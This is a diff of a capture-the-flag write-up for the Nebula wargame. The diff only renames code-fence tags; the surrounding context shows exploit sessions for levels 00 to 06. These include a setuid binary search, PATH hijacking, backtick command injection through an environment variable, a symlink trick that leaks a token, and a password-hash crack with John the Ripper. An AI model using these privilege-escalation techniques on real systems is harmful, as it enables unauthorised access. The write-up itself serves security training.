@@ -2,7 +2,7 @@ Nebula Writeup
 ==============
 
 ## 00
-```Shell Session
+```console
 level00@nebula:~$ find / -nowarn -perm +04000 -user flag00 2> /dev/null 
 /bin/.../flag00
 /rofs/bin/.../flag00
@@ -13,20 +13,20 @@ You have successfully executed getflag on a target account
 ```
 
 ## 01
-```Shell Session
+```console
 level01@nebula:~$ ln -s /bin/getflag echo
 level01@nebula:~$ PATH=.:$PATH /home/flag01/flag01
 You have successfully executed getflag on a target account
 ```
 
 ## 02
-```Shell Session
+```console
 level02@nebula:~$ USER="\`/bin/getflag\`" /home/flag02/flag02 
 You have successfully executed getflag on a target account is coolo
 ```
 
 ## 03
-```Shell Session
+```console
 level03@nebula:~$ cat run.sh 
 #!/bin/bash
 /bin/getflag > /tmp/flag03.out
@@ -38,14 +38,14 @@ You have successfully executed getflag on a target account
 ```
 
 ### 04
-```Shell Session
+```console
 level04@nebula:~$ ln -s ../flag04/token link
 level04@nebula:~$ ../flag04/flag04 link 
 06508b5e-8909-4f38-b630-fdb148a848a2
 ```
 
 ## 05 
-```Shell Session
+```console
 ls -la ../flag05/
 total 5
 drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
@@ -64,7 +64,7 @@ You have successfully executed getflag on a target account
 ```
 
 ## 06
-```Shell Session
+```console
 imac:run gwyn$ cat passwd
 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
 imac:run gwyn$ ./john passwd
